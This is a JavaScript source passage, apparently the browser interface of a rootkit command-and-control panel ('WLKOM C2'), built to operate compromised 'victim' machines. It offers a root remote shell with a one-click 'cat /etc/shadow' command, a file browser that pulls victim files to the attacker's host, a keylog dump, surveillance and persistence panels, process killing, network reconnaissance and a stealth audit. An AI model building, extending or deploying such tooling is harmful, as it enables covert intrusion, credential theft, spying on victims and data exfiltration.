    sb+='<div class="nav-section"><div class="nav-section-title">'+sec.s+'</div>';
    sec.items.forEach(it=>{sb+='<div class="nav-item '+(S.panel===it.id?'active':'')+'" onclick="nav(\''+it.id+'\')">'+I[it.icon]+'<span class="label">'+it.l+'</span></div>'});
    sb+='</div>';
  });
  sb+='</div><div class="collapse-toggle" onclick="toggleCol()">'+(S.collapsed?I.chevR:I.chevL)+'</div></div>';

  const con=S.rkUp;
  const top='<div class="topbar">'+
    '<div class="session-badge'+(con?'':' off')+'"><span class="dot"></span>'+(con?'root@'+SYSTEM.hostname:'Disconnected')+'</div>'+
    '<div style="font-size:11px;color:var(--t4)">'+(con?SYSTEM.ip:'--')+'</div>'+
    '<div class="uptime" id="uptm">\u25B2 '+fmtUp(S.uptime)+'</div>'+
    '<button class="btn btn-sm" onclick="toggleCmd()" style="background:var(--bg-0);border:1px solid var(--border-l);padding:4px 12px">'+
    '<span style="color:var(--t4);font-size:11px">Search... <kbd style="font-size:9px;background:var(--bg-3);padding:1px 5px;border-radius:3px;font-family:var(--font-mono)">Ctrl+K</kbd></span></button>'+
    '<div class="spacer"></div>'+
    '<div style="display:flex;align-items:center;gap:6px;font-size:11px;color:var(--t3)">'+
    '<svg width="16" height="12" viewBox="0 0 16 12" fill="none" stroke="var(--green)" stroke-width="1.5"><polyline points="0,6 3,6 5,2 7,10 9,4 11,8 13,6 16,6"><animate attributeName="opacity" values="1;.4;1" dur="1.5s" repeatCount="indefinite"/></polyline></svg>'+
    '<span style="font-family:var(--font-mono);font-size:10px">24ms</span></div>'+
    '<button class="top-btn" onclick="nav(\'activity\')" title="Notifications">'+I.bell+'<span class="badge-count">'+Math.min(S.events.length,99)+'</span></button>'+
    '<span class="badge '+(S.rkAuth?'b-pass':'b-warn')+'" style="padding:3px 10px;font-size:10px">'+(S.rkAuth?'RK AUTH':'RK PENDING')+'</span>'+
    '<button class="logout-btn" onclick="logout()" title="Logout">'+I.logOut+'<span>Logout</span></button>'+
    '</div>';

  const stat='<div class="statusbar" id="sbar">'+
    '<div class="st-item"><span class="st-dot '+(S.wsUp?'g':'r')+'"></span><span>WS '+(S.wsUp?'Connected':'Offline')+'</span></div>'+
    '<div class="st-item"><span class="st-dot g"></span><span>ChaCha20-Poly1305</span></div>'+
    '<div class="st-item" style="color:var(--t3)">v5.0</div>'+
    '<div style="flex:1"></div>'+
    '<div class="st-item"><span class="st-dot '+(S.rkUp?'g':'r')+'"></span><span>Rootkit '+(S.rkUp?(S.rkAuth?'Auth':'Awaiting'):'Offline')+'</span></div>'+
    '<div class="st-item" style="color:var(--t3)">'+S.events.length+' events</div></div>';

  return '<div class="app'+(S.collapsed?' collapsed':'')+'">'+sb+top+'<div class="main" id="mc"></div>'+stat+'</div><div id="cmdp"></div>';
}

function authGate(){
  const noGate=['terminal','activity'];
  if(noGate.includes(S.panel))return null;
  if(S.rkAuth)return null;
  const lockIcon='<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--yellow)" stroke-width="1.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>';
  let msg='<div style="text-align:center;padding:60px 20px">';
  msg+=lockIcon;
  msg+='<h2 style="color:var(--t1);margin:16px 0 8px;font-size:20px">Authentication Required</h2>';
  if(!S.rkUp){
    msg+='<p style="color:var(--t3);font-size:13px;margin-bottom:20px">No rootkit connected. Waiting for victim to connect...</p>';
    msg+='<div class="badge b-fail" style="padding:6px 16px;font-size:12px">Rootkit Offline</div>';
  }else if(S.rkLocked){
    msg+='<p style="color:var(--t3);font-size:13px;margin-bottom:20px">Too many failed attempts. Locked for <strong style="color:var(--red)">'+S.rkLockSec+'s</strong></p>';
    msg+='<div class="badge b-fail" style="padding:6px 16px;font-size:12px">Locked</div>';
  }else{
    msg+='<p style="color:var(--t3);font-size:13px;margin-bottom:20px">Rootkit connected but not authenticated.<br>Enter the rootkit password in the terminal to unlock all features.</p>';
    msg+='<button class="btn" onclick="nav(\'terminal\')" style="padding:8px 24px;font-size:13px;gap:8px">'+I.terminal+' Go to Terminal</button>';
  }
  msg+='</div>';
  return msg;
}
function renderPanel(){
  const el=document.getElementById('mc');if(!el)return;
  const gate=authGate();
  if(gate){el.innerHTML='<div class="fade-in">'+gate+'</div>';return}
  const fn=panels[S.panel]||panels.dashboard;el.innerHTML='<div class="fade-in">'+fn()+'</div>';postRender();
}
function safeRender(){
  const ae=document.activeElement;
  if(ae&&(ae.tagName==='INPUT'||ae.tagName==='TEXTAREA'))return;
  renderPanel();
}
function updateStatus(){const el=document.getElementById('sbar');if(el){el.innerHTML='<div class="st-item"><span class="st-dot '+(S.wsUp?'g':'r')+'"></span><span>WS '+(S.wsUp?'Connected':'Offline')+'</span></div><div class="st-item"><span class="st-dot g"></span><span>ChaCha20-Poly1305</span></div><div class="st-item" style="color:var(--t3)">v5.0</div><div style="flex:1"></div><div class="st-item"><span class="st-dot '+(S.rkUp?'g':'r')+'"></span><span>Rootkit '+(S.rkUp?(S.rkAuth?'Auth':'Awaiting'):'Offline')+'</span></div><div class="st-item" style="color:var(--t3)">'+S.events.length+' events</div>'}}

function setupApp(){
  document.onkeydown=(e)=>{
    if((e.metaKey||e.ctrlKey)&&e.key==='k'){e.preventDefault();toggleCmd()}
    if(e.key==='Escape')closeCmdPal();
  };
}

function nav(p){S.panel=p;const app=document.getElementById('app');if(app&&S.token){app.innerHTML=renderApp();renderPanel();setupApp();autoLoad(p)}}
function autoLoad(p){
  if(!S.rkAuth)return;
  if(p==='processes'&&S.procs.length===0)refreshProcesses().then(()=>renderPanel());
  if(p==='network'&&S.netConns.length===0)refreshNetAll();
  if(p==='keylogger')klCheckStatus();
  if(p==='surveillance'&&S.survPtsList.length===0)survListPts();
  if(p==='persistence'&&!S.persistChecking)persistCheckAll();
}
function toggleCol(){S.collapsed=!S.collapsed;nav(S.panel)}
function logout(){fetch('/api/logout',{method:'POST',headers:{'X-Token':S.token}}).catch(()=>{});S.token=null;S.pw=null;sessionStorage.removeItem('c2token');if(ws){ws.close();ws=null}render()}

/* ===== PANELS ===== */
const panels={};

/* DASHBOARD */
panels.dashboard=function(){
  const evLen=S.events.length;
  const loaded=SYSTEM.hostname!=='--';
  const circR=30,circC=2*Math.PI*circR,stPass=Object.values(S.stRes).filter(r=>r.pass).length,stTotal=Object.keys(S.stRes).length,stMax=STEALTH_CHECKS.length,pct=stTotal>0?(stPass/stMax):0;
  let h='<div class="panel-hdr"><div><div class="panel-title">Dashboard</div><div class="panel-sub">'+(loaded?'Connected to '+SYSTEM.hostname+' ('+SYSTEM.ip+')':'Waiting for data...')+'</div></div><div class="panel-actions"><button class="btn btn-sm" onclick="refreshAll().then(()=>renderPanel())">'+I.refresh+' Refresh All</button></div></div>';
  if(!S.rkAuth){
    h+='<div class="card" style="text-align:center;padding:40px;color:var(--yellow)"><div style="font-size:16px;font-weight:600;margin-bottom:8px">Rootkit Authentication Required</div><div style="color:var(--t3)">Go to the <a href="#" onclick="nav(\'terminal\');return false" style="color:var(--red)">Terminal</a> and enter the rootkit password to start.</div></div>';
    return h;
  }
  // Status cards
  h+='<div class="grid g3" style="margin-bottom:20px">';
  h+='<div class="stat-card c-green"><div class="stat-label">Connection</div><div class="stat-value" style="color:var(--green);font-size:20px">CONNECTED</div><div class="stat-sub">'+SYSTEM.hostname+' | root | '+SYSTEM.ip+'</div></div>';
  const stLbl=stTotal>0?(stPass===stMax?'All passing':''+stPass+'/'+stMax+' passing'):'Not tested';
  const stClr=stTotal>0?(stPass===stMax?'var(--green)':'var(--yellow)'):'var(--t4)';
  h+='<div class="stat-card c-purple"><div class="stat-label">Stealth Score</div><div style="display:flex;align-items:center;gap:16px;margin-top:4px"><div class="circ" style="width:64px;height:64px"><svg width="64" height="64"><circle cx="32" cy="32" r="'+circR+'" fill="none" stroke="var(--bg-3)" stroke-width="5"/><circle cx="32" cy="32" r="'+circR+'" fill="none" stroke="'+stClr+'" stroke-width="5" stroke-dasharray="'+circC+'" stroke-dashoffset="'+(circC*(1-pct))+'" stroke-linecap="round" style="transition:stroke-dashoffset 1s"/></svg><div class="circ-inner"><span class="circ-val" style="font-size:18px">'+(stTotal>0?stPass+'/'+stMax:'--')+'</span></div></div><div style="font-size:11px;color:var(--t3)">'+stLbl+'</div></div></div>';
  h+='<div class="stat-card c-cyan"><div class="stat-label">Session</div><div class="stat-value" style="font-size:18px">'+evLen+'</div><div class="stat-sub">events | uptime: '+fmtUp(S.uptime)+'</div></div>';
  h+='</div>';
  // System info
  if(loaded){
    h+='<div class="card" style="margin-bottom:16px"><div class="card-title">System Information</div><div class="grid g2" style="gap:8px">';
    h+='<div class="info-grid">';
    [['Hostname',SYSTEM.hostname],['OS',SYSTEM.os],['Kernel',SYSTEM.kernel],['Architecture',SYSTEM.arch],['CPU',SYSTEM.cpu],['Cores',SYSTEM.cores]].forEach(r=>{h+='<div class="info-row"><span class="lbl">'+r[0]+'</span><span class="val" style="font-size:'+(String(r[1]).length>25?'9':'11')+'px">'+esc(String(r[1]))+'</span></div>'});
    h+='</div><div class="info-grid">';
    [['IP Address',SYSTEM.ip],['MAC',SYSTEM.mac],['Gateway',SYSTEM.gateway],['RAM',SYSTEM.ramUsed+' / '+SYSTEM.ramTotal+' MB'],['Disk',SYSTEM.diskUsed+' / '+SYSTEM.diskTotal],['Uptime',SYSTEM.uptimeSys]].forEach(r=>{h+='<div class="info-row"><span class="lbl">'+r[0]+'</span><span class="val" style="font-size:'+(String(r[1]).length>25?'9':'11')+'px">'+esc(String(r[1]))+'</span></div>'});
    h+='</div></div>';
    const ramPct=SYSTEM.ramTotal>1?Math.round(SYSTEM.ramUsed/SYSTEM.ramTotal*100):0;
    const bars=[{l:'RAM',pct:ramPct,c:'var(--blue)'},{l:'Disk',pct:SYSTEM.diskPct||0,c:'var(--green)'}];
    h+='<div style="display:flex;gap:20px;margin-top:14px">';
    bars.forEach(b=>{h+='<div style="flex:1"><div style="display:flex;justify-content:space-between;margin-bottom:4px"><span style="font-size:10px;color:var(--t3)">'+b.l+'</span><span style="font-size:10px;color:var(--t2);font-family:var(--font-mono)">'+b.pct+'%</span></div><div class="pbar"><div class="pbar-fill" style="width:'+b.pct+'%;background:'+b.c+'"></div></div></div>'});
    h+='</div></div>';
  } else {
    h+='<div class="card" style="margin-bottom:16px;text-align:center;padding:30px;color:var(--t3)"><span class="spinner" style="margin-right:8px"></span> Loading system information...</div>';
  }
  // Quick Actions
  h+='<div class="card" style="margin-bottom:16px"><div class="card-title">Quick Actions</div><div class="grid g4" style="gap:10px">';
  h+='<button class="btn" style="padding:12px;flex-direction:column;gap:6px;justify-content:center" onclick="refreshAll().then(()=>renderPanel())">'+I.refresh+'<span style="font-size:11px">Refresh All</span></button>';
  h+='<button class="btn" style="padding:12px;flex-direction:column;gap:6px;justify-content:center" onclick="nav(\'stealth\');setTimeout(runStealthAll,300)">'+I.shield+'<span style="font-size:11px">Stealth Audit</span></button>';
  h+='<button class="btn" style="padding:12px;flex-direction:column;gap:6px;justify-content:center" onclick="klAction(\'dump\')">'+I.keyboard+'<span style="font-size:11px">Dump Keylog</span></button>';
  h+='<button class="btn" style="padding:12px;flex-direction:column;gap:6px;justify-content:center" onclick="nav(\'terminal\')">'+I.terminal+'<span style="font-size:11px">Open Terminal</span></button>';
  h+='</div></div>';
  // Recent events
  if(evLen>0){
    h+='<div class="card"><div class="card-title">Recent Activity</div><div style="max-height:200px;overflow-y:auto"><table class="dtable"><thead><tr><th style="width:80px">Time</th><th style="width:70px">Type</th><th>Message</th></tr></thead><tbody>';
    S.events.slice(-10).reverse().forEach(ev=>{
      h+='<tr><td class="mono" style="font-size:11px;color:var(--t3)">'+esc(ev.time)+'</td><td><span class="badge '+typeCls(ev.type)+'">'+ev.type+'</span></td><td style="font-size:12px">'+esc(ev.msg)+'</td></tr>';
    });
    h+='</tbody></table></div></div>';
  }
  return h;
};

/* TERMINAL */
panels.terminal=function(){
  const hn=SYSTEM.hostname!=='--'?SYSTEM.hostname:'victim';
  let h='<div class="panel-hdr"><div><div class="panel-title">Real Time Response</div><div class="panel-sub">Interactive shell'+(S.rkUp?' \u2014 root@'+hn:' \u2014 Disconnected')+'</div></div><div class="panel-actions"><span class="badge '+(S.rkAuth?'b-pass':'b-fail')+'" style="padding:4px 12px"><span style="display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--'+(S.rkAuth?'green':'red')+');margin-right:6px;animation:'+(S.rkAuth?'pulse 2s infinite':'none')+'"></span>'+(S.rkAuth?'Live Session':'Offline')+'</span></div></div>';
  h+='<div class="terminal"><div class="term-header"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">'+(S.rkAuth?'root@'+hn+' \u2014 bash \u2014 '+SYSTEM.ip:'Not connected')+'</div><div style="flex:1"></div><button class="btn btn-xs" onclick="S.termLines=[];renderPanel()" style="border:none;background:var(--bg-active)">Clear</button></div>';
  // Quick commands
  const qcmds=['id','whoami','uname -a','ps aux','ls -la','ifconfig','netstat -tlnp','free -m','df -h','uptime','cat /etc/shadow','ss -tnp'];
  h+='<div class="quick-actions">';
  qcmds.forEach(c=>{h+='<button class="qbtn" onclick="termExec(\''+c.replace(/'/g,"\\'")+'\')">'+esc(c)+'</button>'});
  h+='</div>';
  // Body
  h+='<div class="term-body" id="tbody">';
  if(S.termLines.length===0){
    h+='<div class="term-line sys">WLKOM C2 - Encrypted Shell (ChaCha20-Poly1305)</div>';
    h+='<div class="term-line sys">Session: root@'+hn+' ('+SYSTEM.ip+')</div>';
    h+='<div class="term-line info">Type "help" for available commands. All commands execute on victim via encrypted C2.</div>';
    h+='<div class="term-line info"></div>';
  }
  S.termLines.forEach(l=>{h+='<div class="term-line '+l.type+'">'+esc(l.text)+'</div>'});
  if(termBusy){
    h+='<div class="term-prompt"><span class="ps1">'+esc(termPrompt())+'</span><span class="spinner" style="width:12px;height:12px"></span><span style="color:var(--t4);margin-left:8px;font-size:11px">executing...</span></div>';
  }else if(S.rkLocked){
    h+='<div class="term-prompt" style="color:var(--red)"><span class="ps1" style="color:var(--red)">[LOCKED] </span><span style="font-size:12px">Too many failed attempts. Retry in '+S.rkLockSec+'s</span></div>';
  }else if(S.rkAwait&&!S.rkAuth){
    h+='<div class="term-prompt"><span class="ps1" style="color:var(--yellow)">[password] </span><input id="tinp" type="password" autocomplete="off" spellcheck="false" autofocus placeholder="Enter rootkit password..."></div>';
  }else{
    h+='<div class="term-prompt"><span class="ps1">root@'+hn+':'+esc(S.cwd)+'# </span><input id="tinp" autocomplete="off" spellcheck="false" autofocus></div>';
  }
  h+='</div></div>';
  return h;
};

/* FILESYSTEM */
panels.filesystem=function(){
  const cwd=S.fsCwd;
  const entries=S.fsTree[cwd]||[];
  if(!S.rkAuth){return '<div class="panel-hdr"><div><div class="panel-title">File System</div></div></div><div class="card" style="text-align:center;padding:40px;color:var(--yellow)">Authenticate rootkit first via Terminal.</div>'}
  if(!S.fsTree['/']&&!S.fsLoading){
    S.fsLoading=true;
    fsLoadDir('/').then(()=>{S.fsLoading=false;S.fsExpanded.add('/');renderPanel()});
    return '<div class="panel-hdr"><div><div class="panel-title">File System</div></div></div><div class="card" style="text-align:center;padding:30px;color:var(--t3)"><span class="spinner" style="margin-right:8px"></span> Loading filesystem...</div>';
  }
  if(S.fsLoading&&!S.fsTree['/']){return '<div class="card" style="text-align:center;padding:30px;color:var(--t3)"><span class="spinner" style="margin-right:8px"></span> Loading...</div>'}
  // Toolbar
  const parent=cwd==='/'?null:(cwd.split('/').slice(0,-1).join('/')||'/');
  let h='<div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;flex-wrap:wrap">';
  h+='<button class="btn btn-sm" onclick="fsBack()" '+(S.fsHistory.length<1?'disabled':'')+' title="Back">'+I.chevL+' Back</button>';
  h+='<button class="btn btn-sm" onclick="fsUp()" '+(parent===null?'disabled':'')+' title="Up">'+I.upload+' Up</button>';
  h+='<button class="btn btn-sm" onclick="fsRefresh()" title="Refresh">'+I.refresh+'</button>';
  h+='<input class="input" id="fspath" value="'+esc(cwd)+'" style="flex:1;min-width:200px;font-family:var(--font-mono);font-size:12px" onkeydown="if(event.key===\'Enter\')fsGoInput()">';
  h+='<button class="btn btn-sm" onclick="fsGoInput()">Go</button>';
  h+='<button class="btn btn-sm btn-success" onclick="fsUploadFlow()">'+I.upload+' Upload</button>';
  h+='<button class="btn btn-sm" onclick="fsDlDir(\''+esc(cwd)+'\')" style="color:var(--cyan)">'+I.download+' Extract All</button>';
  h+='</div>';
  // Main layout: tree + files
  h+='<div style="display:flex;gap:12px;min-height:480px">';
  // Left: Tree
  h+='<div class="card" style="width:220px;flex-shrink:0;padding:0;overflow:hidden"><div style="padding:8px 12px;border-bottom:1px solid var(--border);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3)">Folders</div>';
  h+='<div style="overflow-y:auto;max-height:440px;padding:4px 0">';
  h+=renderTreeNode('/',0);
  h+='</div></div>';
  // Right: Files
  h+='<div style="flex:1;display:flex;flex-direction:column;gap:12px">';
  h+='<div class="card" style="flex:1;padding:0;overflow:hidden"><div style="max-height:440px;overflow-y:auto"><table class="dtable"><thead><tr><th style="width:26px"></th><th>Name</th><th style="width:70px">Size</th><th style="width:90px">Perms</th><th style="width:60px">Owner</th><th style="width:80px">Modified</th><th style="width:130px">Actions</th></tr></thead><tbody>';
  if(cwd!=='/'){
    h+='<tr style="cursor:pointer" onclick="fsUp()"><td style="color:var(--blue);text-align:center">'+I.chevL+'</td><td style="color:var(--blue)">..</td><td colspan="4" style="color:var(--t4)">Parent directory</td><td></td></tr>';
  }
  if(entries.length===0&&S.fsTree[cwd]){
    h+='<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--t4)">Empty directory</td></tr>';
  }
  entries.forEach(e=>{
    h+='<tr style="cursor:'+(e.isDir?'pointer':'default')+'" '+(e.isDir?'onclick="fsNav(\''+e.fp+'\')"':'')+'>';
    h+='<td style="text-align:center;color:var(--'+(e.isDir?'blue':'t3')+')">'+(e.isDir?I.folder:I.file)+'</td>';
    h+='<td style="color:var(--'+(e.isDir?'blue':e.name.startsWith('.')?'t4':'t1')+');font-family:var(--font-mono);font-size:12px">'+esc(e.name)+'</td>';
    h+='<td class="mono" style="color:var(--t3);font-size:11px">'+e.size+'</td>';
    h+='<td class="mono" style="font-size:10px;color:var(--'+(e.perms.includes('x')&&!e.isDir?'green':'t3')+')">'+e.perms+'</td>';
    h+='<td style="color:var(--'+(e.owner==='root'?'red':'t2')+');font-size:11px">'+e.owner+'</td>';
    h+='<td class="mono" style="font-size:10px;color:var(--t4)">'+e.mod+'</td>';
    h+='<td><div style="display:flex;gap:4px">'+(e.isDir?'<button class="btn btn-xs" onclick="event.stopPropagation();fsDlDir(\''+e.fp+'\')" title="Download folder as archive" style="color:var(--cyan)">'+I.download+' .tar.gz</button>':'<button class="btn btn-xs" onclick="event.stopPropagation();fsViewFile(\''+e.fp+'\')" title="View">'+I.eye+' View</button><button class="btn btn-xs btn-success" onclick="event.stopPropagation();fsDl(\''+e.fp+'\')" title="Download">'+I.download+' DL</button>')+'<button class="btn btn-xs btn-danger" onclick="event.stopPropagation();fsDeleteFile(\''+e.fp+'\','+e.isDir+')" title="Delete" style="color:var(--red)">'+I.trash+'</button></div></td>';
    h+='</tr>';
  });
  h+='</tbody></table></div></div>';
  // File preview
  if(S.fsView){
    h+='<div class="card" style="padding:0;overflow:hidden"><div style="padding:8px 12px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><span style="font-size:12px;font-weight:600;color:var(--t1)">'+esc(S.fsView.name)+'</span><div style="display:flex;gap:6px"><button class="btn btn-xs" onclick="fsDl(\''+esc(S.fsView.path)+'\')">'+I.download+' Download</button><button class="btn btn-xs" onclick="S.fsView=null;renderPanel()">'+I.xmark+'</button></div></div><pre style="margin:0;padding:12px;font-family:var(--font-mono);font-size:11px;line-height:1.6;color:var(--t2);white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto;background:#000">'+esc(S.fsView.content)+'</pre></div>';
  }
  h+='</div>';// end right column
  h+='</div>';// end main layout
  // Downloads
  h+='<div class="card" style="margin-top:12px"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><span class="card-title" style="margin:0">Downloaded Files</span><span style="font-size:10px;color:var(--t4)">Saved on attacker at /tmp/wlkom_dl_*</span></div><div id="dllist"></div></div>';
  setTimeout(loadDlList,100);
  return h;
};

function renderTreeNode(path,depth){
  const children=S.fsTree[path];
  const expanded=S.fsExpanded.has(path);
  const active=S.fsCwd===path;
  const name=path==='/'?'/':path.split('/').pop();
  const indent=depth*14;
  let h='<div style="display:flex;align-items:center;padding:3px 8px 3px '+(8+indent)+'px;cursor:pointer;border-left:2px solid '+(active?'var(--red)':'transparent')+';background:'+(active?'var(--red-d)':'transparent')+'" onmouseover="this.style.background=\''+(active?'var(--red-d)':'var(--bg-hover)')+'\'" onmouseout="this.style.background=\''+(active?'var(--red-d)':'transparent')+'\'">';
  if(children&&children.some(e=>e.isDir)){
    h+='<span onclick="event.stopPropagation();fsToggle(\''+path+'\')" style="width:16px;font-size:10px;color:var(--t4);text-align:center;flex-shrink:0">'+(expanded?'\u25BC':'\u25B6')+'</span>';
  } else if(!children){
    h+='<span onclick="event.stopPropagation();fsToggle(\''+path+'\')" style="width:16px;font-size:10px;color:var(--t4);text-align:center;flex-shrink:0">\u25B6</span>';
  } else {
    h+='<span style="width:16px;flex-shrink:0"></span>';
  }
  h+='<span onclick="fsNav(\''+path+'\')" style="display:flex;align-items:center;gap:4px;font-size:12px;color:var(--'+(active?'t1':'t2')+');white-space:nowrap;overflow:hidden;text-overflow:ellipsis"><span style="color:var(--blue);width:14px;height:14px;flex-shrink:0">'+I.folder+'</span>'+esc(name)+'</span>';
  h+='</div>';
  if(expanded&&children){
    const dirs=children.filter(e=>e.isDir).sort((a,b)=>a.name.localeCompare(b.name));
    dirs.forEach(d=>{h+=renderTreeNode(d.fp,depth+1)});
  }
  return h;
}

async function loadDlList(){
  const el=document.getElementById('dllist');if(!el)return;
  try{
    const r=await fetch('/api/downloads');const files=await r.json();
    if(!files||files.length===0){el.innerHTML='<div style="text-align:center;padding:8px;color:var(--t4);font-size:11px">No downloads yet</div>';return}
    let h='<table class="dtable"><thead><tr><th>Source Path</th><th>Size</th><th style="width:120px">Actions</th></tr></thead><tbody>';
    files.forEach(f=>{h+='<tr><td class="mono" style="font-size:11px">'+esc(f.path)+'</td><td class="mono" style="font-size:11px">'+f.size+'B</td><td><div style="display:flex;gap:4px"><a href="/api/dl/'+encodeURIComponent(f.file)+'" class="btn btn-xs btn-success" download>'+I.download+' Save</a><button class="btn btn-xs btn-danger" onclick="dlDelete(\''+esc(f.file)+'\')">'+I.trash+' Del</button></div></td></tr>'});
    h+='</tbody></table>';el.innerHTML=h;
  }catch(e){el.innerHTML='<div style="color:var(--red);font-size:11px;padding:8px">Failed</div>'}
}
async function dlDelete(fname){
  try{
    const r=await fetch('/api/dl/'+encodeURIComponent(fname),{method:'DELETE'});
    const d=await r.json();
    if(d.status==='deleted'){toast('Deleted: '+fname,'info');loadDlList()}
    else{toast('Delete failed: '+(d.error||'unknown'),'error')}
  }catch(e){toast('Delete error','error')}
}

/* PROCESSES */
panels.processes=function(){
  const procs=(S.procs||[]).slice();
  const sort=S.procSort||'cpu';const desc=S.procDesc!==false;
  procs.sort((a,b)=>desc?(b[sort]-a[sort]):(a[sort]-b[sort]));
  const cpuC=v=>v>5?'var(--red)':v>2?'var(--yellow)':'var(--green)';
  const memC=v=>v>10?'var(--red)':v>3?'var(--yellow)':'var(--blue)';
  const total=procs.length;const rootN=procs.filter(p=>p.user==='root').length;
  const cpuSum=procs.reduce((s,p)=>s+p.cpu,0).toFixed(1);const memSum=procs.reduce((s,p)=>s+p.mem,0).toFixed(1);
  let h='<div class="panel-hdr"><div><div class="panel-title">Process Manager</div><div class="panel-sub">'+total+' processes \u2014 '+rootN+' root \u2014 CPU '+cpuSum+'% \u2014 MEM '+memSum+'%</div></div><div class="panel-actions"><button class="btn btn-sm btn-primary" onclick="refreshProcesses().then(()=>renderPanel())">'+I.refresh+' Refresh</button></div></div>';
  if(procs.length===0){
    h+='<div class="card" style="text-align:center;padding:40px;color:var(--t4)">No process data. Click Refresh to load.</div>';
    return h;
  }
  const sHdr=(col,label)=>{const act=sort===col;return '<th style="cursor:pointer;user-select:none'+(act?';color:var(--accent)':'')+'" onclick="S.procSort=\''+col+'\';S.procDesc=S.procSort===\''+col+'\'?!S.procDesc:true;renderPanel()">'+label+(act?(desc?' \u25bc':' \u25b2'):'')+'</th>'};
  h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:500px;overflow-y:auto"><table class="dtable"><thead><tr>'+sHdr('pid','PID')+'<th>User</th>'+sHdr('cpu','CPU %')+sHdr('mem','MEM %')+'<th>Stat</th><th>Command</th><th style="width:60px"></th></tr></thead><tbody>';
  procs.forEach(p=>{
    h+='<tr><td class="mono" style="font-weight:600">'+p.pid+'</td>';
    h+='<td style="color:var(--'+(p.user==='root'?'red':'t2')+');font-weight:'+(p.user==='root'?500:400)+'">'+p.user+'</td>';
    h+='<td><div style="display:flex;align-items:center;gap:6px"><span class="mono" style="width:36px;color:'+cpuC(p.cpu)+'">'+p.cpu.toFixed(1)+'</span><div class="pbar" style="flex:1;max-width:60px"><div class="pbar-fill" style="width:'+Math.min(p.cpu*2,100)+'%;background:'+cpuC(p.cpu)+'"></div></div></div></td>';
    h+='<td><div style="display:flex;align-items:center;gap:6px"><span class="mono" style="width:36px;color:'+memC(p.mem)+'">'+p.mem.toFixed(1)+'</span><div class="pbar" style="flex:1;max-width:60px"><div class="pbar-fill" style="width:'+Math.min(p.mem*5,100)+'%;background:'+memC(p.mem)+'"></div></div></div></td>';
    h+='<td class="mono" style="font-size:11px;color:var(--t3)">'+p.stat+'</td>';
    h+='<td class="mono" style="font-size:11px;max-width:350px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+esc(p.cmd)+'">'+esc(p.cmd)+'</td>';
    h+='<td><button class="btn btn-xs btn-danger" onclick="killProc('+p.pid+')">Kill</button></td></tr>';
  });
  h+='</tbody></table></div></div>';
  return h;
};

/* NETWORK */
panels.network=function(){
  const stClr={'ESTABLISHED':'var(--green)','ESTAB':'var(--green)','LISTEN':'var(--blue)','TIME_WAIT':'var(--yellow)','TIME-WAIT':'var(--yellow)','CLOSE_WAIT':'var(--orange)','CLOSE-WAIT':'var(--orange)','SYN_SENT':'var(--red)','SYN-SENT':'var(--red)','FIN_WAIT':'var(--yellow)','FIN-WAIT1':'var(--yellow)','FIN-WAIT2':'var(--yellow)','UNCONN':'var(--t4)'};
  const svcMap={22:'SSH',53:'DNS',80:'HTTP',443:'HTTPS',8080:'HTTP-Alt',3306:'MySQL',5432:'PostgreSQL',6379:'Redis',27017:'MongoDB',25:'SMTP',110:'POP3',143:'IMAP',21:'FTP',23:'Telnet',3389:'RDP',5900:'VNC',8443:'HTTPS-Alt',9999:'C2-Listen',9998:'C2-Cmd',111:'RPCBind',2049:'NFS',445:'SMB',139:'NetBIOS',631:'CUPS',1080:'SOCKS',8888:'Alt-HTTP'};
  function portSvc(addr){const m=addr.match(/:(\d+)$/);return m?svcMap[parseInt(m[1])]||'':''}
  function fmtBytes(b){b=parseInt(b)||0;if(b<1024)return b+' B';if(b<1048576)return(b/1024).toFixed(1)+' KB';if(b<1073741824)return(b/1048576).toFixed(1)+' MB';return(b/1073741824).toFixed(2)+' GB'}
  const conns=S.netConns||[];
  const ifaces=S.netIfaces||[];
  const routes=S.netRoutes||[];
  const arp=S.netArp||[];
  const dns=S.netDns||[];
  const active=conns.filter(c=>c.state!=='LISTEN'&&c.state!=='LISTENING'&&c.state!=='UNCONN');
  const listeners=conns.filter(c=>c.state==='LISTEN'||c.state==='LISTENING');
  const upIf=ifaces.filter(i=>i.state==='UP'||i.state==='UNKNOWN');
  const tcpC=conns.filter(c=>c.proto==='tcp').length;const udpC=conns.filter(c=>c.proto==='udp').length;
  let h='<div class="panel-hdr"><div><div class="panel-title">Network Analysis</div><div class="panel-sub">Connections, interfaces, routing, scanning & topology</div></div><div class="panel-actions"><button class="btn btn-sm" onclick="refreshNetAll()">'+I.refresh+' Refresh All</button></div></div>';
  h+='<div class="grid g4" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Connections</div><div style="font-size:22px;font-weight:700;color:var(--green)">'+active.length+'</div><div style="font-size:10px;color:var(--t3)">TCP: '+tcpC+' / UDP: '+udpC+'</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Listeners</div><div style="font-size:22px;font-weight:700;color:var(--blue)">'+listeners.length+'</div><div style="font-size:10px;color:var(--t3)">Open services</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Interfaces</div><div style="font-size:22px;font-weight:700;color:var(--cyan)">'+upIf.length+'<span style="font-size:12px;color:var(--t4);font-weight:400">/'+ifaces.length+'</span></div><div style="font-size:10px;color:var(--t3)">Up / Total</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">ARP / DNS</div><div style="font-size:22px;font-weight:700;color:var(--yellow)">'+arp.length+'<span style="font-size:12px;color:var(--t4);font-weight:400"> / '+dns.length+'</span></div><div style="font-size:10px;color:var(--t3)">Neighbors / Resolvers</div></div>';
